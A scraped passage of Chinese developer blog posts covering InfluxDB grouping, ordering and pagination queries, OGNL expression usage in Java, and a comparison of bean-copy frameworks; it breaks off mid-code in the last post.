time(2m) 表示每2分钟做一个分组， group by time(2s)则表示每2s做一个分组 2. 排序在influxdb中排序，只支持针对time进行排序，其他的field，tag（因为是string类型，也没法排）是不能进行排序的 语法比较简单，如下，根据时间倒序/升序 1order by time desc/asc 一个简单的实例如下 12345678910111213# 根据非time进行排序时，直接报错&gt; select * from yhh order by ageERR: error parsing query: only ORDER BY time supported at this time# 根据时间进行倒排&gt; select * from yhh order by time descname: yhhtime age blog id name phone---- --- ---- -- ---- -----2019-07-23T13:48:43.440000821Z 30 http://blog.hhui.top 11 一灰灰3 1102019-07-23T13:48:24.754695002Z 30 http://blog.hhui.top 11 一灰灰22019-07-23T13:45:47.738266214Z 30 http://blog.hhui.top 11 一灰灰2019-07-23T13:45:38.654374538Z 26 http://blog.hhui.top 10 一灰灰&gt; 3. 查询限制我们常见的分页就是limit语句，我们常见的limit语句为 limit page, size，可以实现分页；然而在influxdb中则不同，limit后面只能跟上一个数字，表示限定查询的最多条数 a. limitN指定每次measurement返回的point个数 1SELECT_clause [INTO_clause] FROM_clause [WHERE_clause] [GROUP_BY_clause] [ORDER_BY_clause] LIMIT &lt;N&gt; 下满给出几个实际的case 1234567891011121314151617181920212223242526&gt; select * from yhh limit 2name: yhhtime age blog id name phone---- --- ---- -- ---- -----2019-07-23T13:45:38.654374538Z 26 http://blog.hhui.top 10 一灰灰2019-07-23T13:45:47.738266214Z 30 http://blog.hhui.top 11 一灰灰# 分组之后，再限定查询条数&gt; select * from yhh group by \"name\" limit 1name: yhhtags: name=一灰灰time age blog id phone---- --- ---- -- -----2019-07-23T13:45:38.654374538Z 26 http://blog.hhui.top 10name: yhhtags: name=一灰灰2time age blog id phone---- --- ---- -- -----2019-07-23T13:48:24.754695002Z 30 http://blog.hhui.top 11name: yhhtags: name=一灰灰3time age blog id phone---- --- ---- -- -----2019-07-23T13:48:43.440000821Z 30 http://blog.hhui.top 11 110 b. slimitN指定从指定measurement返回的series数 1SELECT_clause [INTO_clause] FROM_clause [WHERE_clause] GROUP BY *[,time(&lt;time_interval&gt;)] [ORDER_BY_clause] SLIMIT &lt;N&gt; 接下来演示下这个的使用姿势，首先准备插入几条数据，确保tag相同 123456789101112131415161718192021&gt; insert yhh,name=一灰灰,phone=110 blog=\"http://spring.hhui.top\",age=14,id=14&gt; insert yhh,name=一灰灰,phone=110 blog=\"http://spring.hhui.top\",age=15,id=15&gt; insert yhh,name=一灰灰,phone=110 blog=\"http://spring.hhui.top\",age=16,id=16&gt; select * from yhhname: yhhtime age blog id name phone---- --- ---- -- ---- -----2019-07-23T13:45:38.654374538Z 26 http://blog.hhui.top 10 一灰灰2019-07-23T13:45:47.738266214Z 30 http://blog.hhui.top 11 一灰灰2019-07-23T13:48:24.754695002Z 30 http://blog.hhui.top 11 一灰灰22019-07-23T13:48:43.440000821Z 30 http://blog.hhui.top 11 一灰灰3 1102019-08-14T11:18:06.804162557Z 14 http://spring.hhui.top 14 一灰灰 1102019-08-14T11:18:10.146588721Z 15 http://spring.hhui.top 15 一灰灰 1102019-08-14T11:18:12.753413004Z 16 http://spring.hhui.top 16 一灰灰 110&gt; show series on test from yhhkey---yhh,name=一灰灰yhh,name=一灰灰,phone=110yhh,name=一灰灰2yhh,name=一灰灰3,phone=110 如下面的一个使用case 123456789101112131415161718192021222324252627&gt; select * from yhh group by * slimit 3name: yhhtags: name=一灰灰, phone=time age blog id---- --- ---- --2019-07-23T13:45:38.654374538Z 26 http://blog.hhui.top 102019-07-23T13:45:47.738266214Z 30 http://blog.hhui.top 11name: yhhtags: name=一灰灰, phone=110time age blog id---- --- ---- --2019-08-14T11:18:06.804162557Z 14 http://spring.hhui.top 142019-08-14T11:18:10.146588721Z 15 http://spring.hhui.top 152019-08-14T11:18:12.753413004Z 16 http://spring.hhui.top 16name: yhhtags: name=一灰灰2, phone=time age blog id---- --- ---- --2019-07-23T13:48:24.754695002Z 30 http://blog.hhui.top 11name: yhhtags: name=一灰灰3, phone=110time age blog id---- --- ---- --2019-07-23T13:48:43.440000821Z 30 http://blog.hhui.top 11 说实话，这一块没看懂，根据官方的文档进行翻译的，没有get这个slimit的特点 4. 分页上面只有point个数限制，但是分页怎么办？难道不支持么？ 在influxdb中，有专门的offset来实现分页 1SELECT_clause [INTO_clause] FROM_clause [WHERE_clause] [GROUP_BY_clause] [ORDER_BY_clause] LIMIT_clause OFFSET &lt;N&gt; [SLIMIT_clause] 简单来讲，就是limit 条数 offset 偏移 使用实例 12345678910111213141516171819&gt; select * from yhhname: yhhtime age blog id name phone---- --- ---- -- ---- -----2019-07-23T13:45:38.654374538Z 26 http://blog.hhui.top 10 一灰灰2019-07-23T13:45:47.738266214Z 30 http://blog.hhui.top 11 一灰灰2019-07-23T13:48:24.754695002Z 30 http://blog.hhui.top 11 一灰灰22019-07-23T13:48:43.440000821Z 30 http://blog.hhui.top 11 一灰灰3 1102019-08-14T11:18:06.804162557Z 14 http://spring.hhui.top 14 一灰灰 1102019-08-14T11:18:10.146588721Z 15 http://spring.hhui.top 15 一灰灰 1102019-08-14T11:18:12.753413004Z 16 http://spring.hhui.top 16 一灰灰 110# 查询结果只有2条数据，从第三个开始（0开始计数）&gt; select * from yhh limit 2 offset 3name: yhhtime age blog id name phone---- --- ---- -- ---- -----2019-07-23T13:48:43.440000821Z 30 http://blog.hhui.top 11 一灰灰3 1102019-08-14T11:18:06.804162557Z 14 http://spring.hhui.top 14 一灰灰 110&gt; select * from yhh limit 2 offset 3 5. 小结本篇influxdb的查询篇主要介绍了sql中的三种常用case，分组，排序，分页；虽然使用姿势和我们常见的SQL大同小异，但是一些特殊点需要额外注意一下 分组查询时，注意分组的key必须是time或者tag，分组查询可以返回完整的point 排序，只支持根据时间进行排序，其他的字段都不支持 分页，需要注意limit size offset startIndex和我们一般的使用case不同，它的两个参数分别表示查询的point个数，以及偏移量；而不是传统sql中的页和条数 II. 其他0. 系列博文 190813-Influx Sql系列教程八：query数据查询基本篇 190730-Influx Sql系列教程七：delete 删除数据 190729-Influx Sql系列教程六：insert 修改数据 190726-Influx Sql系列教程五：insert 添加数据 190723-Influx Sql系列教程四：series/point/tag/field 190721-Influx Sql系列教程三：measurement 表 190719-Influx Sql系列教程二：retention policy 保存策略 190718-Influx Sql系列教程一：database 数据库 190717-Influx Sql系列教程零：安装及influx-cli使用姿势介绍 190509-InfluxDb之时间戳显示为日期格式 190506-InfluxDB之配置修改 190505-InfluxDB之权限管理 180727-时序数据库InfluxDB之备份和恢复策略 180726-InfluxDB基本概念小结 180725-InfluxDB-v1.6.0安装和简单使用小结 参考博文 https://docs.influxdata.com/influxdb/v1.7/query_language/data_exploration/#the-basic-select-statement 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/08/14/190814-Influx-Sql系列教程九：query数据查询基本篇二/"},{"title":"191204-Ognl 使用实例手册","text":"上一篇博文介绍了ongl的基础语法，接下来进入实际的使用篇，我们将结合一些实际的case，来演示ognl究竟可以支撑到什么地步 在看本文之前，强烈建议先熟悉一下什么是ognl，以及其语法特点，减少阅读障碍，五分钟入门系列： 191129-Ognl 语法基础教程 I. 基本使用1. 配置我们选用的是java开发环境，使用maven来进行包管理，首先在pom文件中添加依赖 123456&lt;!-- https://mvnrepository.com/artifact/ognl/ognl --&gt;&lt;dependency&gt; &lt;groupId&gt;ognl&lt;/groupId&gt; &lt;artifactId&gt;ognl&lt;/artifactId&gt; &lt;version&gt;3.2.11&lt;/version&gt;&lt;/dependency&gt; 2. 基础使用对于Ognl的使用，关键的地方在于获取OgnlContext, 在这个上下文中保存一些实例用来支撑ognl的语法 所以一般使用ognl的先前操作就是创建OgnlContext，然后将我们的实例扔到上下文中，接收ognl表达式，最后执行并获取结果 伪代码如下 12345678910111213141516// 构建一个OgnlContext对象OgnlContext context = (OgnlContext) Ognl.createDefaultContext(this, new DefaultMemberAccess(true), new DefaultClassResolver(), new DefaultTypeConverter());// 设置根节点，以及初始化一些实例对象context.setRoot(this);context.put(\"实例名\", obj);...// ognl表达式执行Object expression = Ognl.parseExpression(\"#a.name\")Object result = Ognl.getValue(expression, context, context.getRoot()); II. 实例演示接下来进入实例演示，首先我们需要创建两个测试对象，用于填充OgnlContext 0. 准备两个普通对象，一个静态类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162@Data@NoArgsConstructor@AllArgsConstructorpublic class ADemo { private String name; private Integer age;}@Datapublic class PrintDemo { private String prefix; private ADemo aDemo; public void sayHello(String name, int age) { System.out.println(\"name: \" + name + \" age: \" + age); } private void print(ADemo a) { System.out.println(prefix + \" =&gt; \" + a); } public &lt;T&gt; T print(String str, Class&lt;T&gt; clz) { T obj = JSON.parseObject(str, clz); System.out.println(\"class: \" + obj); return obj; } public void print(String str, String clz) { System.out.println(\"str2a: \" + str + \" clz: \" + clz); } public void print(String str, OgnlEnum ognlEnum) { System.out.println(\"enum: \" + str + \":\" + ognlEnum); } public void print(String str, ADemo a) { System.out.println(\"obj: \" + str + \":\" + a); } public void show(Class clz) { System.out.println(clz.getName()); }}public class StaticDemo { private static int num = (int) (Math.random() * 100); public static int showDemo(int a) { System.out.println(\"static show demo: \" + a); return a; }}public enum OgnlEnum { CONSOLE, FILE;} 上面在创建OgnlContext时，有一个DefaultMemberAccess类，主要用于设置成员的访问权限，需要自己实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657@Setterpublic class DefaultMemberAccess implements MemberAccess { private boolean allowPrivateAccess = false; private boolean allowProtectedAccess = false; private boolean allowPackageProtectedAccess = false; public DefaultMemberAccess(boolean allowAllAccess) { this(allowAllAccess, allowAllAccess, allowAllAccess); } public DefaultMemberAccess(boolean allowPrivateAccess, boolean allowProtectedAccess, boolean allowPackageProtectedAccess) { super(); this.allowPrivateAccess = allowPrivateAccess; this.allowProtectedAccess = allowProtectedAccess; this.allowPackageProtectedAccess = allowPackageProtectedAccess; } @Override public Object setup(Map context, Object target, Member member, String propertyName) { Object result = null; if (isAccessible(context, target, member, propertyName)) { AccessibleObject accessible = (AccessibleObject) member; if (!accessible.isAccessible()) { result = Boolean.TRUE; accessible.setAccessible(true); } } return result; } @Override public void restore(Map context, Object target, Member member, String propertyName, Object state) { if (state != null) { ((AccessibleObject) member).setAccessible((Boolean) state); } } /** * Returns true if the given member is accessible or can be made accessible by this object. */ @Override public boolean isAccessible(Map context, Object target, Member member, String propertyName) { int modifiers = member.getModifiers(); if (Modifier.isPublic(modifiers)) { return true; } else if (Modifier.isPrivate(modifiers)) { return this.allowPrivateAccess; } else if (Modifier.isProtected(modifiers)) { return this.allowProtectedAccess; } else { return this.allowPackageProtectedAccess; } }} 接下来创建我们的OgnlContext对象 12345678910111213141516ADemo a = new ADemo();a.setName(\"yihui\");a.setAge(10);PrintDemo print = new PrintDemo();print.setPrefix(\"ognl\");print.setADemo(a);// 构建一个OgnlContext对象// 扩展，支持传入class类型的参数OgnlContext context = (OgnlContext) Ognl.createDefaultContext(this, new DefaultMemberAccess(true), new DefaultClassResolver(), new DefaultTypeConverter());context.setRoot(print);context.put(\"print\", print);context.put(\"a\", a); 到此，我们的前置准备已经就绪，接下来进入实际case篇 1. 实例访问我们的实例访问分为两类，分别为实例的方法调用；实例的属性访问 a. 实例方法调用比如我们希望执行 print的sayHello方法，可以如下使用 12Object ans = Ognl.getValue(Ognl.parseExpression(\"#print.sayHello(\\\"一灰灰blog\\\", 18)\"), context, context.getRoot());System.out.println(\"实例方法执行： \" + ans); 关键点在ognl表达式: #print.sayHello(&quot;一灰灰blog&quot;, 18)，其中print为实例名，对应的构建OgnlContext对象之后执行的context.put(&quot;print&quot;, print);这一行代码 输出结果: 12name: 一灰灰blog age: 18实例方法执行： null b. 实例成员属性访问成员属性的访问可以划分为直径获取成员属性值和设置成员属性值，对此可以如下使用 12345ans = Ognl.getValue(Ognl.parseExpression(\"#a.name=\\\"一灰灰Blog\\\"\"), context, context.getRoot());System.out.println(\"实例属性设置： \" + ans);ans = Ognl.getValue(Ognl.parseExpression(\"#a.name\"), context, context.getRoot());System.out.println(\"实例属性访问： \" + ans); 输出结果 12实例属性设置： 一灰灰Blog实例属性访问： 一灰灰Blog 看到上面这个，自然会想到一个问题，可不可以访问父类的私有成员呢？ 为了验证这个问题，我们新建一个实例继承自ADemo，并注册到 OgnlContext 上下文 123456789101112131415@Datapublic class BDemo extends ADemo { private String address;}// 注册到ognlContextBDemo b = new BDemo();b.setName(\"b name\");b.setAge(20);b.setAddress(\"测试ing\");context.put(\"b\", b);// 测试caseans = Ognl.getValue(Ognl.parseExpression(\"#b.name\"), context, context.getRoot());System.out.println(\"实例父类属性访问：\" + ans); 输出结果如下 1实例父类属性访问：b name 注意： 我们这里可以直接访问私有成员，访问私有方法，访问父类的私有成员，这些都得益于我们自定义的DefaultMemberAccess，并制定了访问策略为true（即私有、保护、默认访问权限的都可以访问） 2. 静态类访问实例成员，需要先注册到OgnlContext之后才能根据实例名来访问，但是静态类则不需要如此，默认支持当前的ClassLoader加载的所有静态类的访问姿势；下面我们进入实例演示 a. 静态类方法调用静态类的访问需要注意的是需要传入全路径，用@开头，类与方法之间也是用@进行分割 123ans = Ognl.getValue(Ognl.parseExpression(\"@git.hui.fix.test.ognl.bean.StaticDemo@showDemo(20)\"), context, context.getRoot());System.out.println(\"静态类方法执行：\" + ans); 输出结果 1static show demo: 20 a. 静态类成员访问同样我们分为成员访问和修改 1234567ans = Ognl.getValue(Ognl.parseExpression(\"@git.hui.fix.test.ognl.bean.StaticDemo@num\"), context, context.getRoot());System.out.println(\"静态类成员访问：\" + ans);ans = Ognl.getValue(Ognl.parseExpression(\"@git.hui.fix.test.ognl.bean.StaticDemo@num=1314\"), context, context.getRoot());System.out.println(\"静态类成员设置：\" + ans); 输出结果如下 123456789静态类方法执行：20ognl.InappropriateExpressionException: Inappropriate OGNL expression: @git.hui.fix.test.ognl.bean.StaticDemo@num at ognl.SimpleNode.setValueBody(SimpleNode.java:312) at ognl.SimpleNode.evaluateSetValueBody(SimpleNode.java:220) at ognl.SimpleNode.setValue(SimpleNode.java:301) at ognl.ASTAssign.getValueBody(ASTAssign.java:53) at ognl.SimpleNode.evaluateGetValueBody(SimpleNode.java:212) 直接设置静态变量，抛出了移仓，提示InappropriateExpressionException 那么静态类的成员可以修改么？这里先留一个疑问 3. 特殊传参一般的java操作，无外乎方法调用，属性访问两种，接下来我们聚焦在方法的调用上；如果一个方法接收的参数是一些基本类型的对象，使用起来还比较简单；但是其他的场景呢? a. class类型参数如我们前面的PrintDemo中，有一个方法如下 12345public &lt;T&gt; T print(String str, Class&lt;T&gt; clz) { T obj = JSON.parseObject(str, clz); System.out.println(\"class: \" + obj); return obj;} 如需调用上面的方法，clz参数可以怎么处理呢? 123456789ans = Ognl.getValue(Ognl.parseExpression( \"#print.print(\\\"{'name':'xx', 'age': 20}\\\", @git.hui.fix.test.ognl.bean.ADemo@class)\"), context, context.getRoot());System.out.println(\"class 参数方法执行：\" + ans);// class传参ans = Ognl.getValue(Ognl.parseExpression(\"#print.print(\\\"{'name':'haha', 'age': 10}\\\", #a.getClass())\"), context, context.getRoot());System.out.println(\"class 参数方法执行：\" + ans); 上面给出了两种方式，一个是根据已有的对象获取class，一个是直接根据静态类获取class，输出结果如下 1234class: ADemo(name=xx, age=20)class 参数方法执行：ADemo(name=xx, age=20)class: ADemo(name=haha, age=10)class 参数方法执行：ADemo(name=haha, age=10) b. 枚举参数如PrintDemo中的方法, 其中第二个参数为枚举 123public void print(String str, OgnlEnum ognlEnum) { System.out.println(\"enum: \" + str + \":\" + ognlEnum);} 结合上面的使用姿势，这个也不太难 1234ans = Ognl.getValue( Ognl.parseExpression(\"#print.print(\\\"print enum\\\", @git.hui.fix.test.ognl.model.OgnlEnum@CONSOLE)\"), context, context.getRoot());System.out.println(\"枚举参数方法执行：\" + ans); 输出结果 12enum: print enum:CONSOLE枚举参数方法执行：null c. null传参目标方法如下 123private void print(ADemo a) { System.out.println(prefix + \" =&gt; \" + a);} 因为我们需要传参为空对象，稍微有点特殊，ognl针对这个进行了支持，传参直接填null即可 12ans = Ognl.getValue(Ognl.parseExpression(\"#print.print(null)\"), context, context.getRoot());System.out.println(\"null 传参：\" + ans); 输出如下 12ognl =&gt; nullnull 传参：null 然后一个问题来了，在PrintDemo中的print方法，有多个重载的case，那么两个参数都传null，具体是哪个方法会被执行呢？ 1234567891011121314151617public &lt;T&gt; T print(String str, Class&lt;T&gt; clz) { T obj = JSON.parseObject(str, clz); System.out.println(\"class: \" + obj); return obj;}public void print(String str, String clz) { System.out.println(\"str2a: \" + str + \" clz: \" + clz);}public void print(String str, OgnlEnum ognlEnum) { System.out.println(\"enum: \" + str + \":\" + ognlEnum);}public void print(String str, ADemo a) { System.out.println(\"obj: \" + str + \":\" + a);} 通过实际的测试，第三个方法被调用了，这里面难道有啥潜规则么，然而我并没有找到 12ans = Ognl.getValue(Ognl.parseExpression(\"#print.print(null, null)\"), context, context.getRoot());System.out.println(\"null 传参：\" + ans); 输出 12enum: null:nullnull 传参：null d. 对象传递传参是一个POJO对象，这个时候咋整？ 123public void print(String str, ADemo a) { System.out.println(\"obj: \" + str + \":\" + a);} 现在的问题主要集中在如何构建一个Aemo对象，当做参数丢进去，通过前面的语法篇我们知道ognl是支持new来创建对象的， 如果ADemo恰好提供了全属性的构造方法，那么可以如下操作 123ex = Ognl.parseExpression(\"#print.print(\\\"对象构建\\\", new git.hui.fix.test.ognl.bean.ADemo(\\\"test\\\", 20))\");Object ans = Ognl.getValue(ex, context, context.getRoot());System.out.println(\"对象传参：\" + ans); 注意观察上面的ognl表达式，其中重点在new git.hui.fix.test.ognl.bean.ADemo(&quot;test&quot;, 20))，创建对象的时候，请指定全路径名 输出结果 12obj: 对象构建:ADemo(name=test, age=20)对象传参：null 上面这个虽然实现了我们的case，但是有局限性，如果这个POJO没有全属性的构造方法，又可以怎么整？ 这里就需要借助ognl语法中的链式语句了，通过new创建对象，然后设置属性，最后抛出对象 123ex = Ognl.parseExpression(\"#print.print(\\\"对象构建\\\", (#demo=new git.hui.fix.test.ognl.bean.ADemo(), #demo.setName(\\\"一灰灰\\\"), #demo))\");ans = Ognl.getValue(ex, context, context.getRoot());System.out.println(\"对象传参：\" + ans); 核心语句在(#demo=new git.hui.fix.test.ognl.bean.ADemo(), #demo.setName(\\&quot;一灰灰\\&quot;), #demo)，创建对象，设置属性 输出结果 12obj: 对象构建:ADemo(name=一灰灰, age=null)对象传参：null 虽说上面实现了我们的需求场景，但是这里有个坑，我们创建的这个属性会丢到OgnlContext上下文中，所以这种操作非常有可能导致我们自己创建的临时对象覆盖了原有的对象 那么有什么方法可以避免么？ 这个问题先攒着，后面再叙说 e. 容器传参在PrintDemo对象中添加方法 1234567public void print(List&lt;Integer&gt; args) { System.out.println(args);}public void print(Map&lt;String, Integer&gt; args) { System.out.println(args);} 然后我们的访问case如下 1234567ex = Ognl.parseExpression(\"#print.print({1, 3, 5})\");ans = Ognl.getValue(ex, context, context.getRoot());System.out.println(\"List传参：\" + ans);ex = Ognl.parseExpression(\"#print.print(#{\\\"A\\\": 1, \\\"b\\\": 3, \\\"c\\\": 5})\");ans = Ognl.getValue(ex, context, context.getRoot());System.out.println(\"Map传参：\" + ans); 输出结果 1234[1, 3, 5]List传参：null{A=1, b=3, c=5}Map传参：null 4. 表达式执行接下来属于另外一个范畴的case了，执行一些简单的算术操作or条件表达式 123456ans = Ognl.getValue(Ognl.parseExpression(\"1 + 3 + 4\"), context, context.getRoot());System.out.println(\"表达式执行: \" + ans);// 阶乘ans = Ognl.getValue(Ognl.parseExpression(\"#fact = :[#this&lt;=1? 1 : #this*#fact(#this-1)], #fact(3)\"), context, context.getRoot());System.out.println(\"lambda执行: \" + ans); 输出 12表达式执行: 8lambda执行: 6 III. 小结鉴于篇幅过长，本篇博文将只限于使用基础的ognl能支持到什么地步，在java中使用ognl套路比较简单 1. 创建OgnlContext，并注册实例1234567891011// 构建一个OgnlContext对象OgnlContext context = (OgnlContext) Ognl.createDefaultContext(this, new DefaultMemberAccess(true), new DefaultClassResolver(), new DefaultTypeConverter());// 设置根节点，以及初始化一些实例对象context.setRoot(this);context.put(\"实例名\", obj);... 2. 编译ognl表达式，并获取执行结果123// ognl表达式执行Object expression = Ognl.parseExpression(\"#a.name\")Object result = Ognl.getValue(expression, context, context.getRoot()); 3. 遗留博文中遗留了两个问题尚未解答 静态成员默认场景下不能修改，那么有办法让它支持修改么 方法传参，传递对象时，通过链式创建临时对象时会缓存在OgnlContext上下文中，如何避免这种场景？ II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/12/04/191204-Ognl-使用实例手册/"},{"title":"210408-常见Bean拷贝框架使用姿势及性能对比","text":"Bean属性拷贝，主要针对几个常用的拷贝框架进行性能对比，以及功能扩展支持 选用的框架 cglib (直接使用Spring封装的BeanCopier) apache MapStruct Spring HuTool I.背景当业务量不大时，不管选择哪个框架都没什么问题，只要功能支持就ok了；但是当数据量大的时候，可能就需要考虑性能问题了；再实际的项目中，正好遇到了这个问题，不仅慢，还发现会有锁竞争，这特么就尼普了 项目中使用的是Spring的 BeanUtils， 版本 3.2.4.RELEASE， 版本相对较老，主要问题在于org.springframework.beans.CachedIntrospectionResults.forClass 1234567891011121314151617181920212223242526272829303132333435363738394041/** * Create CachedIntrospectionResults for the given bean class. * &lt;P&gt;We don't want to use synchronization here. Object references are atomic, * so we can live with doing the occasional unnecessary lookup at startup only. * @param beanClass the bean class to analyze * @return the corresponding CachedIntrospectionResults * @throws BeansException in case of introspection failure */static CachedIntrospectionResults forClass(Class beanClass) throws BeansException { CachedIntrospectionResults results; Object value; synchronized (classCache) { value = classCache.get(beanClass); } if (value instanceof Reference) { Reference ref = (Reference) value; results = (CachedIntrospectionResults) ref.get(); } else { results = (CachedIntrospectionResults) value; } if (results == null) { if (ClassUtils.isCacheSafe(beanClass, CachedIntrospectionResults.class.getClassLoader()) || isClassLoaderAccepted(beanClass.getClassLoader())) { results = new CachedIntrospectionResults(beanClass); synchronized (classCache) { classCache.put(beanClass, results); } } else { if (logger.isDebugEnabled()) { logger.debug(\"Not strongly caching class [\" + beanClass.getName() + \"] because it is not cache-safe\"); } results = new CachedIntrospectionResults(beanClass); synchronized (classCache) { classCache.put(beanClass, new WeakReference&lt;CachedIntrospectionResults&gt;(results)); } } } return results;} 看上面的实现，每次获取value都加了一个同步锁，而且还是锁的全局的classCache，这就有些过分了啊，微妙的是这段代码注释，谷歌翻译之后为 我们不想在这里使用同步。 对象引用是原子的，因此我们可以只在启动时进行偶尔的不必要查找。 这意思大概是说我就在启动的时候用一下，并不会频繁的使用，所以使用了同步代码块也问题不大… 但是在BeanUtils#copyProperties中就蛋疼了，每次都会执行这个方法，扎心了 当然我们现在一般用的Spring5+了，这段代码也早就做了改造了，新版的如下，不再存在上面的这个并发问题了 12345678910111213141516171819202122232425262728293031323334/** * Create CachedIntrospectionResults for the given bean class. * @param beanClass the bean class to analyze * @return the corresponding CachedIntrospectionResults * @throws BeansException in case of introspection failure */@SuppressWarnings(\"unchecked\")static CachedIntrospectionResults forClass(Class&lt;?&gt; beanClass) throws BeansException { CachedIntrospectionResults results = strongClassCache.get(beanClass); if (results != null) { return results; } results = softClassCache.get(beanClass); if (results != null) { return results; } results = new CachedIntrospectionResults(beanClass); ConcurrentMap&lt;Class&lt;?&gt;, CachedIntrospectionResults&gt; classCacheToUse; if (ClassUtils.isCacheSafe(beanClass, CachedIntrospectionResults.class.getClassLoader()) || isClassLoaderAccepted(beanClass.getClassLoader())) { classCacheToUse = strongClassCache; } else { if (logger.isDebugEnabled()) { logger.debug(\"Not strongly caching class [\" + beanClass.getName() + \"] because it is not cache-safe\"); } classCacheToUse = softClassCache; } CachedIntrospectionResults existing = classCacheToUse.putIfAbsent(beanClass, results); return (existing != null ? existing : results);} II. 不同框架使用姿势接下来我们看一下几种常见的bean拷贝框架的使用姿势，以及对比测试 1. apache BeanUtils阿里规范中，明确说明了，不要使用它，idea安装阿里的代码规范插件之后，会有提示 使用姿势比较简单，引入依赖 123456&lt;!-- https://mvnrepository.com/artifact/commons-beanutils/commons-beanutils --&gt;&lt;dependency&gt; &lt;groupId&gt;commons-beanutils&lt;/groupId&gt; &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt; &lt;version&gt;1.9.4&lt;/version&gt;&lt;/dependency&gt; 属性拷贝 12345678910@Componentpublic class ApacheCopier { public &lt;K, T&gt; T copy(K source, Class&lt;T&gt; target) throws IllegalAccessException, InstantiationException, InvocationTargetException { T res = target.newInstance(); // 注意，第一个参数为target，第二个参数为source // 与其他的正好相反 BeanUtils.copyProperties(res, source); return res; }} 2. cglib BeanCopiercglib是通过动态代理的方式来实现属性拷贝的，与上面基于反射实现方式存在本质上的区别，这也是它性能更优秀的主因 在Spring环境下，一般不需要额外的引入依赖；或者直接引入spring-core 1234567&lt;!-- cglib --&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-core&lt;/artifactId&gt; &lt;version&gt;5.2.8.RELEASE&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt;&lt;/dependency&gt; 属性拷贝 1234567891011121314151617181920@Componentpublic class SpringCglibCopier { /** * cglib 对象转换 * * @param source * @param target * @param &lt;K&gt; * @param &lt;T&gt; * @return * @throws IllegalAccessException * @throws InstantiationException */ public &lt;K, T&gt; T copy(K source, Class&lt;T&gt; target) throws IllegalAccessException, InstantiationException { BeanCopier copier = BeanCopier.create(source.getClass(), target, false); T res = target.newInstance(); copier.copy(source, res, null); return res; }} 当然也可以直接使用纯净版的cglib，引入依赖 12345&lt;dependency&gt; &lt;groupId&gt;cglib&lt;/groupId&gt; &lt;artifactId&gt;cglib&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt;&lt;/dependency&gt; 使用姿势和上面一模一样 1234567891011121314151617181920@Componentpublic class PureCglibCopier { /** * cglib 对象转换 * * @param source * @param target * @param &lt;K&gt; * @param &lt;T&gt; * @return * @throws IllegalAccessException * @throws InstantiationException */ public &lt;K, T&gt; T copy(K source, Class&lt;T&gt; target) throws IllegalAccessException, InstantiationException { BeanCopier copier = BeanCopier.create(source.getClass(), target, false); T res = target.newInstance(); copier.copy(source, res, null); return res; }} 3. spring BeanUtils这里使用的是spring 5.2.1.RELEASE， 就不要拿3.2来使用了，不然并发下的性能实在是感人 基于内省+反射，借助getter/setter方法实现属性拷贝，性能比apache高 核心依赖 123456&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-beans&lt;/artifactId&gt; &lt;version&gt;5.2.1.RELEASE&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt;&lt;/dependency&gt; 属性拷贝 1234567891011121314151617181920@Componentpublic class SpringBeanCopier { /** * 对象转换 * * @param source * @param target * @param &lt;K&gt; * @param &lt;T&gt; * @return * @throws IllegalAccessException * @throws InstantiationException */ public &lt;K, T&gt; T copy(K source, Class&lt;T&gt; target) throws IllegalAccessException, InstantiationException { T res = target.newInstance(); BeanUtils.copyProperties(source, res); return res; }} 4. hutool BeanUtilhutool 提供了很多的java工具类，从测试效果来看它的性能比apache会高一点，当低于spring 引入依赖 12345&lt;dependency&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-core&lt;/artifactId&gt; &lt;version&gt;5.6.0&lt;/version&gt;&lt;/dependency&gt; 使用姿势 12345678910111213141516@Componentpublic class HutoolCopier { /** * bean 对象转换 * * @param source * @param target * @param &lt;K&gt; * @param &lt;T&gt; * @return */ public &lt;K, T&gt; T copy(K source, Class&lt;T&gt; target) throws Exception { return BeanUtil.toBean(source, target); }} 5. MapStructMapStruct 性能更强悍了，缺点也比较明显，需要声明bean的转换接口，自动代码生成的方式来实现拷贝，性能媲美直接的get/set 引入依赖 12345678910&lt;dependency&gt; &lt;groupId&gt;org.mapstruct&lt;/groupId&gt; &lt;artifactId&gt;mapstruct&lt;/artifactId&gt; &lt;version&gt;1.4.2.Final&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.mapstruct&lt;/groupId&gt; &lt;artifactId&gt;mapstruct-processor&lt;/artifactId&gt; &lt;version&gt;1.4.2.Final&lt;/version&gt;&lt;/dependency&gt; 使用姿势 12345678910111213@Mapperpublic interface MapStructCopier { Target copy(Source source);}@Componentpublic class MapsCopier { private MapStructCopier mapStructCopier = Mappers.getMapper(MapStructCopier.class); public Target copy(Source source, Class&lt;Target&gt; target) { return mapStructCopier.copy(source); }} 缺点也比较明显，需要显示的接口转换声明 6. 测试定义两个Bean，用于转换测试，两个bean的成员属性名，类型完全一致 1234567891011121314151617@Datapublic class Source { private Integer id; private String user_name; private Double price; private List&lt;Long&gt; ids; private BigDecimal marketPrice;}@Datapublic class Target { private Integer id; private String user_name; private Double price; private List&lt;Long&gt; ids; private BigDecimal marketPrice;} 6.1 功能测试123456789101112131415161718192021222324private Random random = new Random();public Source genSource() { Source source = new 